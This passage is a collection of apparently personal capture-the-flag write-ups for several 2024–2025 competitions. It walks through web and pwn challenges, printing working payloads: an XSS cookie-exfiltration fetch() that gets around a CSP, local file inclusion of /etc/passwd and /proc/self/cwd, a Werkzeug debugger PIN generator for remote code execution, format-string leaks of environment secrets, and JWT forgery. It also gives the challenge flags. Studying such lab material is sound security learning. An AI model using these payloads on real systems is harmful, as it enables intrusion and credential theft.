at <code>/</code>, we  find that the js script linked to the file also takes the query parameter <code>auto_input</code> to fill up the iframe. This is valuable as it allows us to inject any html we wish just using the url, e.g. when using <code>/report</code>. However, It is also worth noting all input is sanitized by <pre><code>function sanitizeInput(str) {  \n    str = str.replace(/&lt;.*&gt;/igm, '').replace(/&lt;\\.*&gt;/igm, '').replace(/&lt;.*&gt;.*&lt;\\/.*&gt;/igm, '');   \n    return str;  \n}\n</code></pre> , which seems to strip all text that resembles html tags. What if we supplied an incomplete tag, and let the browser close it for us?  Simple, right? Now we can provide a script tag with its src pointing to our payload to extract the cookie. But nope. Unfortunately, all requests are given these pesky CSP headers, preventing both scripts from other urls and inline scripts from running <pre><code>@app.after_request  \ndef add_security_headers(resp):  \n    resp.headers['Content-Security-Policy'] = \"script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;\"  \n    return resp\n</code></pre> We could have to find a way to get the script to fulfill this csp, which is where the url not found page comes in handy. Since any unknown path is reflected back in the page content as text, we could use that as the source of the payload, without any CSP violation.   This is still not valid js, so we need to mangle the url further </p>"},{"location":"Ctfs/Sekai%20Ctf%202024%20writeups/#conclusion","title":"Conclusion","text":"<p>We have this js: <pre><code>fetch('URL HERE', {body: document.cookie, method: 'POST'});\n</code></pre> The url payload: <code>http://127.0.0.1:5000/?fulldisplay=j&amp;auto_input=http://127.0.0.1:5000/**/JS HERE//;</code> We get the final url for <code>/report</code>: <code>http://127.0.0.1:5000/?fulldisplay=j&amp;auto_input=&lt;script src=\"http://127.0.0.1:5000/**/fetch('***', {body: document.cookie, method: 'POST', mode:'no-cors'});//\"//</code> , giving us the flag.</p> <p>Notes: - I should've used a get request to make my life easier. I have also discovered <code>Nagivator.sendBeacon()</code> which seems like a quick and easy way to do requests. - Mixing <code>localhost</code> and <code>127.0.0.1</code> is not ideal, despite them both pointing to the same thing</p>"},{"location":"Ctfs/Whitehacks%202025%20Writeups/","title":"Travel back to a time gone by","text":"<p>We are given a single static page with no extra forms/requests/js. When inspecting the html of the page, we can find a mysterious hidden image.  Opening it, the flag is shown </p> <p>Pro-tip for future \"find the flag\" challenges: Set burp to show images too in case the flags are hidden in the image/it's response headers</p> <p><code>WH2025{ilovechinatownandwannavisititoneday}</code></p>"},{"location":"Ctfs/Whitehacks%202025%20Writeups/#dirbusted","title":"Dirbusted","text":""},{"location":"Ctfs/Whitehacks%202025%20Writeups/#langspython","title":"langs/python","text":"<p>As hinted by the challenge name, we probably should use the dirbuster tool on the website(I wasn't very sure about this as I thought the ctf forbid scanners/brute force). Initially choosing to dirbust both files and directories,  I realized the scan would take way too long. Hence, I went back to the website to see if there was anything noteworthy. As seen from the headers, the server running this site is SimpleHttp, the built-in http module in python.  A quick google search shows that there seems to be some sort of built-in directory listing , unless an <code>index.html</code> or <code>index.htm</code> file is found, in which case the latter is displayed instead(The directory listing still works for other directories). This will simplify the scanning process as we would only need to find a valid directory path to be able to view all its contents. Running dirbuster to only find directories this time, we find the <code>hidden</code> folder  From there, we see it holds the flag  <code>WH2025{DIBUSTYYYYYYY!!!!!}</code></p> <p>For future reference: Behavior of the SimpleRequestHandler can be further inspected. Perhaps there is a way to trick it to display the dir listing even if the index files exist https://github.com/python/cpython/blob/main/Lib/http/server.py#L841</p>"},{"location":"Ctfs/Whitehacks%202025%20Writeups/#live-fun","title":"Live fun","text":""},{"location":"Ctfs/Whitehacks%202025%20Writeups/#langsphp","title":"langs/php","text":"<p>We are given a suspiciously empty page with not much information  Most of the text seems unimportant, except the underlined page? which stands out. Come to think of it, it does seem to be hinting for us to try that query parameter, so let's try that.  How interesting. It seems the sever is taking the query parameter and trying to include a file into the php code directly. I first tried guessing random filenames like <code>flag.txt</code> but didn't get any results  To ensure the LFI was even working, I tried the common paths to text, such as <code>/etc/passwd</code>  Oh. There is the flag I guess??? <code>WH2025{LEAVEMEALONEpls}</code></p>"},{"location":"Ctfs/Whitehacks%202025%20Writeups/#traversal","title":"Traversal","text":""},{"location":"Ctfs/Whitehacks%202025%20Writeups/#langspython_1","title":"langs/python","text":"<p>We are greeted with a website with 2 links to <code>memo_1.txt</code> and <code>memo_2.txt</code>  Visiting them, we see the server seems to send the file specified by the <code>file</code> query parameter.   Additionally, memo 2 mentions something about path traversal being fixed.  Let's try it out either way. Trying to find the app's source code, I blindly tried <code>http://challenges.whitehats-ctf.com:8009/download?file=../app.py</code>, only for it to get denied.  it seems traversing up a directory is blocked, as any path containing <code>..</code> gets rejected  If relative paths don't work, how about absolute paths? Once again trying the common file paths, I checked out <code>/etc/passwd</code> and successfully downloaded the file, meaning absolute paths worked.  Here, we see the <code>john</code> user and his home directory <code>/home/john</code>, which might be where the app might be running at. I blindly tried guessing various paths to find <code>app.py</code> such as <code>/home/john/app.py</code>, <code>/home/john/app/app.py</code>, <code>/home/john/main.py</code>... only to realize I probably would never manage to guess the location of the app</p>"},{"location":"Ctfs/Whitehacks%202025%20Writeups/#the-cheese","title":"The cheese","text":"<p>Instead of trying to brute force the possible paths, I instead turned my attention to the special linux directories, namely the proc filesystem. Inside it contains directories that are mapped to processes in the form <code>/proc/&lt;pid&gt;</code>, and contains fancy information about the current running processes, such as environment variables and the command line args used to run the program. </p> <p>There is also the <code>cwd</code> subdirectory, which links to the working directory in which a process was started in. In addition to accessing the corresponding directories by pid, there is also the <code>/proc/self</code> directory, which links to the proc data directory of the process accessing it. By accessing <code>/proc/self/cwd</code>, we effectively get to the working directory of the app without knowing it's path. From there, we are able to get the source code of the app, revealing the flag hardcoded in.  <code>WH2025{wh0a_d1Rec7oRy_tR4v3r$A1_1s_c00L}</code></p>"},{"location":"Ctfs/Whitehacks%202025%20Writeups/#post-ctf-lessons","title":"Post ctf lessons","text":""},{"location":"Ctfs/Whitehacks%202025%20Writeups/#flawless-login-page","title":"Flawless login page","text":"<p>TODO Sql oracle attack didn't work???? Put the various payloads I tried here</p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/","title":"YesbutNo 2024 Qual Writeups","text":"<p>We managed to get 14th place out of 123 with 21632 points but sadly did not qualify. Challenges roughly ordered by how hard I felt they were. Solves:  Hero 1(crypto?), Inspector Who(web), Don't Look At Me!!!(web), Web web web(web), Simple website(web), Stationary threat(web), Number oracle(web), MORE KABOOMMMMM(web), cool math games(crypto), Memory sim(pwn), View source revenge(web), NoButYes(web), Needle in a haystack(pwn)</p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#hero-1","title":"Hero 1","text":"<p>This wasn't really a cryto challenge. <pre><code>from Crypto.Util.number import getPrime, bytes_to_long\n\nflag = b\"YBN24{????????????????????????}\"\n\np = getPrime(256)\nq = getPrime(256)\ny = getPrime(256)\ne = getPrime(64)\nc = getPrime(32)\n\n\ntry:\n    a = int(eval(input(\"a: \")))\n    b = int(eval(input(\"b: \")))\n\n    assert a &gt; 0\nexcept:\n    quit()\n\n\ng = q * e\nn = ((a) ** (b + c)) * p * q * y\n\nenc = pow(bytes_to_long(flag), e, n)\n\nct = enc * y\n\nprint(\"g = {}\".format(g))\nprint(\"n = {}\".format(n))\nprint(\"ct = {}\".format(ct))\n</code></pre> For some reason, the inputs a and b are directly evaluated, so we can simple submit <code>print(flag)</code> as the input and we will get the flag. <code>YBN24{RS4_mu1t!prim3_f4ct0r1ng}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#inspector-who","title":"Inspector who","text":"<p>\"Hey I came across this website displaying a 3D model of the TARDIS! I wonder what I can find from INSPECTING this site...\" By using the power of inspect element, we find the flag  <code>YBN24{1_l0v3_1n5p3ct_3l3m3nt}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#dont-look-at-me","title":"Don't look at me!","text":"<p>Once again with the power of inspect element, we see that a script <code>decrypt.js</code> is being loaded It seems the script is obfuscated so we throw it into a js deobfuscator. <pre><code>function _0x3ca409(_0x50cea5, _0x1e126b) {\n  let _0xdce022 = '';\n  for (let _0x2eb5b4 = 0; _0x2eb5b4 &lt; _0x50cea5.length; _0x2eb5b4++) {\n    let _0x128b0a = _0x50cea5.charCodeAt(_0x2eb5b4) ^ _0x1e126b.charCodeAt(_0x2eb5b4 % _0x1e126b.length);\n    _0x128b0a = _0x128b0a ^ 7;\n    _0xdce022 += String.fromCharCode(_0x128b0a);\n  }\n  return _0xdce022;\n}\nasync function _0x1dc557() {\n  const _0x5f3d96 = await fetch(\"encryptedFlag.txt\");\n  return await _0x5f3d96.text();\n}\nasync function _0x2c43cf() {\n  const _0x1d2082 = await _0x1dc557();\n  const _0x3b9633 = _0x3ca409(_0x1d2082, 'IAMINSOMUCHPAIN');\n  const _0x3196bc = document.getElementById(\"secret\");\n  _0x3196bc.innerHTML = _0x3b9633;\n  window._0x5cd0b7 = () =&gt; {};\n}\n</code></pre> The function <code>_0x2c43cf()</code> seems to be responsible for giving us the flag, load the deobfuscated script into the js console and call <code>_0x2c43cf()</code>, giving us the flag  <code>YBN24{I_To1d_y0u_not_T0_Peek!}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#web-web-web","title":"Web web web","text":"<p>Once again through inspect element, we are able to find parts of the flag. This time, the flag seemed to be split up across different files   The last part was slightly trickier. After quite some time searching, I still could not find it and decided to load burp to assist in searching for it.  From burp, only 3 requests contained the phrase <code>part</code>, meaning the last part of the flag was not from the same page.  I decided to poke around at other common endpoints such as <code>/sitemap.xml</code> and <code>robots.txt</code>, ultimately finding the flag from <code>robots.txt</code> <code>YBN24{th1s_1s_4_c4ll_f0r_h3lp}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#simple-website","title":"Simple website","text":"<p>For this challenge, the site seems to display whatever file it finds from the <code>?page=...</code> query parameter.  As such, this is a LFI challenge and I started poking around for possible locations the flag might be.  After trying various paths, I found the flag in <code>/flag.txt</code> <code>YBN24{lfi_vuln3rable}</code></p> <p>I didn't know text files could be directly included but it do be like that I guess</p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#stationary-threat","title":"Stationary threat","text":"<p>Source code is provided for this challenge. The important parts are <pre><code>roles = ['user', 'student','admin', 'teacher']\n...\n@app.route('/api/users/&lt;_id&gt;/roles', methods=['POST'])  \ndef create_role(_id):  \n    # Our State of the Art Authentication System  \n    if 1==1:  \n        _id = int(_id)  \n        if _id &lt; 0 or _id &gt; len(roles):  \n            return jsonify({'message': 'Invalid id'}), 400  \n        session['role'] = roles[_id]  \n        return jsonify({'message': 'Role created successfully'})  \n    else:  \n        return jsonify({'message': 'Unauthorized'}), 401  \n    @app.route('/nuke')  \ndef nuke():  \n    role = session.get('role',\"user\")  \n    if role == 'admin':  \n        flag = open('flag.txt','r').read()  \n    else:  \n        flag = None   \nreturn render_template('nuke.html', flag=flag)\n</code></pre> * The <code>/nuke</code> endpoint, which requires us to have the <code>admin</code> role retrieved from the session storage. * The  <code>/api/users/&lt;_id&gt;/roles</code> endpoint, which has no authentication and allows us to submit any role id and have it stored in the session storage.  Thus, a simple post request of <code>https://stationary-threat-stationary-threat-chall.ybn.sg/api/users/2/roles</code> allows us to obtain the admin role, then <code>/nuke</code> <code>YBN24{@utHEnT!cA71On?_wha7'S_7h4t?}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#number-oracle","title":"Number oracle","text":"<p>A site where we have to consecutively guess the correct numbers. No source code is provided  Since no source code was provided, I started poking around the page  We can see that there is no script client side and that verification is done by the server.  There is also a session cookie, which when decoded reveals the next number is actually kept in session storage (which when using flask sessions is viewable, but not editable without the secret key).  Thus, by retrieving the session cookie and decoding it each guess, we can correctly submit the next number. I was lazy to do it by hand 10 times so I made a quick script <pre><code>import requests, base64, json  \n\nendpoint = \"https://number-oracle-number-oracle-chall.ybn.sg/\" \nsession = requests.Session()  \n\nr = None  \ndef make_req(num=0):  \n    try:  \n        global r  \n        data = {\"guess\": num}  \n        r = session.post(endpoint, data=data)  \n        cookies = session.cookies.get(\"session\")  \n        print(cookies)  \n        cookies = cookies.split(\".\")[0]  \n        # Add padding if necessary  \n        padding_needed = len(cookies) % 4  \n        if padding_needed:  \n            cookies += '=' * (4 - padding_needed)  \n        s = base64.b64decode(cookies).decode()  \n        num = json.loads(s)[\"next_guess\"]  \n        print(num)  \n        return num  \n    except Exception as e:  \n        print(r.text)  \n        print(session.cookies)  \n        raise e  \n\nnum = 0  \ni = 0  \nwhile True:  \n    i+= 1  \n    num = make_req(num)  \n    print(\"Occ:\", i)  \n    if (i &gt; 10):  \n        break  \n\nprint(r.text)  \nprint(session.cookies)\n</code></pre> <code>YBN24{D0nT_pUT_$3CR3Ts_IN_53S$1ON_coOk1Es_a2650f92c6893e5bb6437}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#more-kaboommmmm","title":"MORE KABOOMMMMM","text":"<p>Source code is provided for this challenge.  <pre><code>...\nrouter.post('/nuke', (req, res) =&gt; {  \n    // Call the backend script with the provided data  \n    const data = req.body;  \n    if (!data.baba || !data.nukes) {  \n        res.status(400).json({ error: 'Invalid data' });  \n        return  \n    }  \n    if (data.baba.length !== 2 || data.nukes.some(nuke =&gt; nuke.length !== 2)) {  \n        res.status(400).json({ error: 'Invalid data' });  \n        return  \n    }  \n\n\n    const {baba,nukes} = data;  \n    baba[0] = Number(baba[0])  \n    baba[1] = Number(baba[1])  \n    if (baba[0] &lt; 0 || baba[0] &gt; 20 || baba[1] &lt; 0 || baba[1] &gt; 20){  \n        res.status(400).json({ error: 'Data Out Of Range' });  \n        return  \n    }  \n    // add an extra nuke at baba's exact position  \n    nukes.push(baba)  \n    var number_of_nukes_hit = 0  \n\n    for (let nuke of nukes){  \n        let [x,y] = nuke;  \n        x = parseInt(x)  \n        y = parseInt(y)  \n        if (x &lt; 0 || x &gt; 20 || y &lt; 0 || y &gt; 20){  \n            res.status(400).json({ error: 'Data Out Of Range' });  \n            return  \n        }  \n        if (Math.abs(baba[0]-x) &lt;= 5 &amp;&amp; Math.abs(baba[1]-y) &lt;= 5){  \n            number_of_nukes_hit += 1  \n        }  \n    }  \n    if (number_of_nukes_hit &gt;= 1){  \n        res.status(200).json({result: `Good Job Comarade. Baba has been successfully nuked! He has suffered a total of ${number_of_nukes_hit} damage.`});  \n    }  \n    else {  \n        res.status(200).json({result: `Baba is safe. You have failed the motherland. ${flag} `});  \n    }  \n});\n</code></pre> Our goal for this challenge is to not get Baba nuked, despite there always being a free nuke added at Baba's position. The vulnerability comes from this line <pre><code>    baba[0] = Number(baba[0])  \n    baba[1] = Number(baba[1])  \n</code></pre> , which directly throws the text we provide into a <code>Number</code> constructor. As per the mdn docs, a number that can't be parsed will return <code>NaN</code>, which could be used to bypass checks. In this case, <code>Nan &gt; ...</code> and <code>Nan &lt; ...</code> both return false, thus the position is considered within range and the baba position check succeeds. <code>Math.abs(baba[0]-x)</code> will still return <code>NaN</code>, which also causes the range checks to fail and no nukes are counted.   <code>YBN24{I_10VE_J4vaScR1P7}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#cool-math-games","title":"Cool math games","text":"<p>Source code is provided. Similar to number oracle, we are supposed to guess the next number except this time without the server providing it. main.py: <pre><code>RAND_SEED = os.getenv(\"seed\")  \nrandom.seed(int(RAND_SEED))  \n\ndef generate_random_string():  \n    return \"\".join([random.choice(ascii_lowercase + ascii_uppercase + digits) for _ in range(32)])  \n\nrounds = 160  \nprint(f\"Welcome to my game! Your user ID is \\\"{generate_random_string()}\\\"\")  \nprint(\"Complete all the rounds of this game, and you win the flag! Good luck!\")  \nfor i in range(rounds):  \n    print('*'*8, f\"Round {i+1}\", '*'*8)  \n    answer_string = generate_random_string()  \n    guess = str(input(\"Enter the string: \"))  \n    if guess != answer_string:  \n        print(\"Sorry, but your response was wrong. Out!\")  \n        exit()  \n    print()  \n    print(f\"Congratulations! Here is your flag: {os.getenv('FLAG')}\")\n</code></pre> startup.sh: <pre><code>#!/bin/bash  \n\nsudo apt install socat -y  \nsudo apt install python3 -y  \n\nseed=$RANDOM  \nexport seed # Credits to Jabriel for the idea  \nexport FLAG=\"YBN24{this_is_a_fake_flag}\"  \n\npip install -r requirements.txt  \nsocat -dd TCP-LISTEN:1337,fork,reuseaddr EXEC:\"python server.py\"\n</code></pre> From the startup script, we can see that the seed is set before the servers run, meaning that the seed is fixed across connections.  Checking what <code>$RANDOM</code> is, we find it is a random number between 0 and 32767. When we first connect, we are given a random user id based on the seed, meaning we can brute force all 32768 seeds until one correctly generates the same user id. <pre><code>for i in range(32768):  \n    random.seed(i)  \n    if generate_random_string() == \"QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg\":  # Our user id\n        print(i)\n</code></pre> From there, we can seed our generator to match the rng used by the server, giving us the exact same randomness as generated by the server. <pre><code>p = remote(\"tcp.ybn.sg\", 28480)  \nid = p.recvline()  \nif \"QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg\" not in id:  \n    print(\"Wrong remote\")  \n    exit()  \np.recvline()  \np.recvline()  \n\nrandom.seed(7631)  \ngenerate_random_string()  # COmpensate for the 1 user id generated\nfor i in range(160):  \n    p.sendline(generate_random_string())  \n    print(p.recvline())  \nprint(p.recvline())\n</code></pre> <code>YBN24{wH0_kN0w5_8a5H_R4nD0m_w4sn7_s0_rAnD0m_4ft3r_4ll}</code></p> <p>The seed can actually be found within the same connection to the server, thus we can both find the seed and then immediately start submitting guesses</p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#memory-sim","title":"Memory sim","text":"<p>A python pwn challenge that simulates memory(?). The goal of this challenge is to access a string from a restricted address. The functions for reading and writing to the memory are: <pre><code>def write_string(s, ind):  \n    sl = len(s)  \n    if ind+sl &gt;= len(MEMORY):  \n        return -1  \n    MEMORY[ind-1] = len(s)  \n    for i in range(ind, ind+sl):  \n        MEMORY[i] = ord(s[i-ind])  \n    return (ind-1) % MLEN\ndef read_string(ind):  \n    stringLen = MEMORY[ind]  \n    ind += 1  \n    if ind+stringLen &gt;= len(MEMORY):  \n        return -1  \n    return \"\".join([chr(i) for i in MEMORY[ind:ind+stringLen]])\n</code></pre> * <code>write_string()</code>, which writes the ordinals of the characters in  string <code>s</code>  at the address space <code>[ind, ind+string length)</code>, and writes the length of the string at index <code>ind-1</code>. It returns the address we can use with <code>read_string()</code> to obtain the string from memory * <code>read_string()</code>, which reads the length of the string at address <code>ind</code>, and reads the integers as characters from memory at the address space <code>[ind+1, ind+string length+1)</code> We then have the main program, responsible for taking and validating user input before calling those functions <pre><code>from string import printable\nMLEN = 1000  \nREAD_ONLY = 900  \nMEMORY = [0] * MLEN  \nMENU = \"\"\"1. write  \n2. read  \n&gt;&gt; \"\"\"\nflag = \"YBN24{?????????????????????????????????????}\"  \nwrite_string(flag, 950)  \ncached = []  \nwhile True:  \n    choice = int(input(MENU))  \n    if choice == 1:  \n        ustr = str(input(\"Enter string\\n&gt;&gt; \"))  \n        if not all(i in printable for i in ustr):  \n            print(\"invalid string\")  \n            continue  \n        uid = int(input(\"Enter address\\n&gt;&gt; \"))  \n        if uid &gt;= READ_ONLY:  \n            print(\"sorry, this region's read only\")  \n            continue  \n        res = write_string(ustr, uid)  \n        if res == -1:  \n            print(\"error\")  \n            continue  \n        print(\"string written successfully! You can view it at\", res)  \n        cached.append(res)  \n        print(f\"You can now access {cached}\")  \n\n    elif choice == 2:  \n        uid = int(input(\"Enter address\\n&gt;&gt; \"))  \n        if uid not in cached:  \n            print(\"Hey, no out of bounds access! &gt;:(\")  \n            continue  \n        res = read_string(uid)  \n        if res == -1:  \n            print(\"error\")  \n            continue  \n        print(\"Your string:\", res)  \n\n    else:  \n        print(\"Invalid choice!\")\n</code></pre> Here, we are restricted from writing at the read only region, and our input has to be a printable character. It should be noted there are no restrictions that prevent us from reading into the restricted region. By having <code>read_string</code> fetch the length of its string from an address where a character was stored instead of the strings length, we could read into the restricted region. <pre><code>write_string('d', 898)\n| Address  |        897        |   898    |\n|----------|-------------------|----------|\n| Value    | 1 (String length) | ord('d') |\n                                 ^ We read from this address\n</code></pre> However, there is a check in place to ensure we can only read from addresses we've written to. If the address is not in <code>cache</code>, we are prevented from reading there. We can circumvent this by simply writing a string at <code>address+1</code> to add <code>address</code> to the cache, then write our payload. <pre><code>write_string('a', 899)\n| Address  | 898 |        899        |   900    |\n|----------|-----|-------------------|----------|\n| Value    |     | 1 (string length) | ord('a') |\nCache: [898]\n\nwrite_string('d', 898)\n| Address  |        898        |   899    |   900    |\n|----------|-------------------|----------|----------|\n| Value    | 1 (string length) | ord('d') | ord('a') |\nCache: [897, 898]\n\nread_string(898)\n| Address  |        898        |   899    |   900    |\n|----------|-------------------|----------|----------|\n| Value    | 1 (string length) | ord('d') | ord('a') |\n This is the string length read ^ \n</code></pre> Thus, our input is as such: 1. 1 a 899 2. 1 d 898 3. 2 898 <code>YBN24{n3g4tive_inDexeS_aNd_struCt_ov3rfl0W!}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#view-source-revenge","title":"View source revenge","text":"<p>A site that allows us to view the contents of any file  I first tried viewing <code>flag.txt</code>, which returned an empty page  Trying <code>/flag.txt</code>, we instead get an error, suggesting the flag was probably censored. Next, I tried the common file names <code>app.py</code> and <code>Dockerfile</code> and managed to retrieve their content <pre><code># Run by Docker\n# This file is included to reduce the guessiness of this challenge. \n# The file run is main.py, which is the identical as the file here.\n\nfrom flask import Flask, request, render_template , redirect, url_for,render_template_string\nimport os \napp = Flask(__name__)\nFLAG = open('flag.txt').read()\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/view', methods = [\"GET\"])\ndef view():\n    file_name = request.args.get('file_name')\n    if not file_name:\n        return redirect(url_for('index'))\n\n    file_path = os.path.join(os.getcwd(), file_name)\n\n    if not os.path.exists(file_path):\n        return render_template('error.html')\n\n    with open(file_path, \"r\") as f:\n        content = f.read()\n\n    content = content.replace(FLAG, \"\")\n\n    return render_template(\"display.html\",content = content,file_name = file_name)\n\nif __name__ == '__main__':\n    app.run(debug = True)\n</code></pre> It is indeed shown that the flag is censored <pre><code># Use an official Python runtime as a parent image\nFROM python:3.11-slim\n# Set the working directory in the container\nWORKDIR /usr/src/app\n# Copy the requirements file into the container\nCOPY requirements.txt ./\n# Install any necessary dependencies\nRUN pip install --no-cache-dir -r requirements.txt\n# Create a new user and group with a secure name\nRUN useradd -m very_secure_username\n# Change ownership of the working directory to the newly created user\nRUN chown -R very_secure_username:very_secure_username /usr/src/app\n# Switch to the new user\nUSER very_secure_username\n# Copy the application code into the container\nCOPY . /usr/src/app\n# Set environment variables\nENV FLASK_APP=app.py\nENV FLASK_ENV=development\nENV FLASK_DEBUG=1\n# Expose the port the app runs on\nEXPOSE 5000\n# Command to run the application\nCMD [\"flask\", \"run\", \"--host=0.0.0.0\"]\n</code></pre> From the dockerfile, we see that <code>FLASK_DEBUG</code> is enabled, meaning the <code>/console</code> endpoint is exposed. Given both LFI and debug mode, we are able to generate the debugger pin and gain RCE. I had also tried to automatically leak the pin using https://github.com/Ruulian/wconsole_extractor but did not succeed(Perhaps my extractor code was broken). After gaining all the information required, we can generate  our debug pin <pre><code>import hashlib  \nfrom itertools import chain  \nprobably_public_bits = [  \n    'very_secure_username',  # username  \n    'flask.app',  # modname  \n    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))  \n    '/usr/local/lib/python3.11/site-packages/flask/app.py'  # getattr(mod, '__file__', None),  \n]  \n\nprivate_bits = [  \n    str(0x921784229705),  # str(uuid.getnode()),  /sys/class/net/ens33/address  \n    '90eca5f1-105b-434e-ad02-135111eb1526'  # get_machine_id(), /etc/machine-id  \n]  \n\n# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0  \nh = hashlib.sha1()  \nfor bit in chain(probably_public_bits, private_bits):  \n    if not bit:  \n        continue  \n    if isinstance(bit, str):  \n        bit = bit.encode('utf-8')  \n    h.update(bit)  \nh.update(b'cookiesalt')  \n# h.update(b'shittysalt')  \n\ncookie_name = '__wzd' + h.hexdigest()[:20]  \n\nnum = None  \nif num is None:  \n    h.update(b'pinsalt')  \n    num = ('%09d' % int(h.hexdigest(), 16))[:9]  \n\nrv = None  \nif rv is None:  \n    for group_size in 5, 4, 3:  \n        if len(num) % group_size == 0:  \n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')  \n                          for x in range(0, len(num), group_size))  \n            break  \n    else:  \n        rv = num  \n\nprint(rv) # &gt;&gt; 889-177-408\n</code></pre> <code>YBN24{F1@sK_DEBUg_CH4L1?_1AM3}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#nobutyes","title":"NoButYes","text":"<p>We are given source code for this challenge. The target of this challenge is the <code>/admin</code> endpoint, where our jwt token needs to identify we have admin <pre><code>def get_secret(uuid):  \n    db = sqlite3.connect('secrets.db')  \n    db.row_factory = lambda cursor, row: row[0]  \n    cursor = db.cursor()  \n    sql = \"SELECT secret FROM secrets WHERE uuid = ?\"  \n    cursor.execute(sql, (uuid,))  \n    secret = str(cursor.fetchone())  \n    db.close()  \n    return secret\n\n@app.route('/admin', methods=['GET'])  \ndef admin():  \n    print(request.cookies,session)  \n    if request.cookies.get('token') is None or session.get('uuid') is None:  \n        return jsonify({\"response\": \"Unauthorized\", \"status\": 401})  \n    token = request.cookies.get('token')  \n    uuid = session['uuid']  \n    secrets = get_secret(session['uuid'])  \n    # TODO: Make somehow sign token with own/known secret?  \n    try:  \n        decoded = jwt.decode(token, secrets, algorithms=[\"HS256\"])  \n    except jwt.ExpiredSignatureError:  \n        return jsonify({\"response\": \"Token Expired\", \"status\": 401})  \n    except jwt.InvalidTokenError:  \n        return jsonify({\"response\": \"Invalid Token\", \"status\": 401})  \n    if decoded['admin']:  \n        return jsonify({\"response\": f\"Welcome Admin. Here's the Flag: {os.getenv('FLAG','TESTFLAG{}')}\", \"status\": 200})  \n    else:  \n        return jsonify({\"response\": \"Only admin's can access this page!\", \"status\": 401})\n</code></pre> Further reviewing the source code, we also see the <code>/api</code> endpoint, which TODO finish sentence <pre><code>def save_token(uuid, secret):  \n    db = sqlite3.connect('secrets.db')  \n    cursor = db.cursor()  \n    sql = \"INSERT OR IGNORE INTO secrets (uuid, secret) VALUES (?, ?)\"  \n    cursor.execute(sql, (uuid, secret))  \n    sql = \"UPDATE secrets SET secret = ? WHERE uuid = ?\"  \n    cursor.execute(sql, (secret, uuid))  \n    db.commit()  \n    db.close()\n\ndef generate_jwt_token():  \n    user_info = {  \n        \"admin\":False  \n    }  \n    secret = os.urandom(32)  \n    secret = secret.hex()  \n    token = jwt.encode(user_info,secret,\"HS256\")  \n    return [token,secret]\n\n@app.route('/api', methods=['POST'])  \ndef api():  \n    session.setdefault('uuid', str(uuid.uuid4()))  \n    data = request.get_json()  \n    command = data.get('command')  \n    # take everything before the first space and lowercase it  \n    prefix = command.split(\" \")[0].lower()  \n\n    if prefix not in command_responses:  \n        return jsonify({\"response\": \"Invalid Command\", \"status\": 400})  \n    response = generate_response(command_responses[prefix], command)  \n\n    jwt_token, secret = generate_jwt_token()  \n    save_token(session['uuid'], secret)  \n\n    response = make_response(jsonify({\"response\": response, \"status\": 200}))  \n    response.set_cookie('token', jwt_token)  \n    return response\n</code></pre> From this code, it should be noted that each user has their jwt token signed with an individual secret that is not shared. The <code>generate_response()</code> function is also rather suspicious <pre><code>class RandomResponse:  \n    def __init__(self, response: str):  \n        self.response = response  \n        self.reroll()  \n\n    def reroll(self):  \n        rand_gen = random.randint(1,10)  \n        self.generated = self.response*rand_gen  \n\ndef generate_response(response, command):  \n    responseObj = RandomResponse(response)  \n    message = \"{response.generated} but \"+command+\".\"  \n    return message.format(response = responseObj)\n</code></pre> For some reason, there is an entire class simply to generate a random message that is repeated a random number of times. Additionally, the <code>message.format</code> function seems to be able to access attributes of <code>RandomResponse</code>, as from <code>{response.generated}</code>. Googling, I found this interesting post on reddit: https://www.reddit.com/r/Python/comments/5kzhnn/be_careful_with_pythons_newstyle_string_format/. Using their payload as a POC, we can get this  Using that, we are able to extract the flask secret key.  Using the key, we are able to forge our own session tokens, controlling <code>uuid</code>. What can we do with a custom uuid? Remember that our goal is to be able to modify the jwt token to give ourselves admin, so we need a way to sign our own jwt tokens. If we revisit <code>get_secret()</code>, one line stands out. <pre><code>def get_secret(uuid):\n    db = sqlite3.connect('secrets.db')  \n    db.row_factory = lambda cursor, row: row[0]  \n    cursor = db.cursor()\n    sql = \"SELECT secret FROM secrets WHERE uuid = ?\"  \n    cursor.execute(sql, (uuid,))\n    secret = str(cursor.fetchone()) # &lt;--\n    ...\n</code></pre> Here, the result from the query is being cast to a string. This is usually not required, as a row should be returned as a string anyways. However, if the uuid queried were to not exist, the returned <code>None</code> would be cast into a string <code>\"None\"</code>, thus returning the secret as <code>\"None\"</code>. By forging a session  token with a non-existent uuid, we are able to sign jwt tokens with <code>\"None\"</code>.  The final step is to access <code>/admin</code>, giving us the flag  <code>YBN24{8@ba_!S_A_B@d_PRo6rAmm3R}</code></p> <p>It should be mentioned a team managed to find a way to gain an invalid uuid without leaking the flask secret. After the session uuid is set and before the secret is saved, there is a check to ensure the command prefix is valid. If the prefix was invalid, only the uuid is saved and the function returns, hence generating an \"invalid\" uuid.  You can also leak the flag from the format string itself <pre><code>{response.init.globals[os].environ[FLAG]}\n</code></pre></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#needle-in-a-haystack","title":"Needle in a haystack","text":"<p>TODO. This is more for personal use. Using <code>printf()</code> with user supplied input is dangerous as it allows memory in the stack to be leaked. We use <code>%&lt;n&gt;$s</code> here to brute force leaking the flag from the stack, 